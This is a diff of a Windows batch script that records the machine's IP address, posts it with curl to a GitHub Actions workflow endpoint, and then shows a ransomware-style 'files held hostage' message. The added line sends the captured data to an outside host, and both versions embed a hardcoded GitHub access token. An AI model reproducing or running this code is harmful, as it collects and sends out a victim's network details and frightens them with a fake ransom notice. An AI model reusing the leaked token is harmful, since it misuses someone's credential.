@@ -14,7 +14,7 @@ ipconfig | find "IPv4 Address" > log.txt
 type captured_ip.txt
 
 :: Step 3: HTTP POST Request to GitHub Actions Endpoint
-curl -X POST -H "Content-Type: text/plain" --data-binary @captured-ip.txt -u Moosey12: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  https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches
+curl -X POST -H "Authorization: Bearer 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" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json" -d "{\"ref\":\"main\"}" https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches
 
 :: Rest of the script remains unchanged
 echo Your files have been held hostage by ransomware...
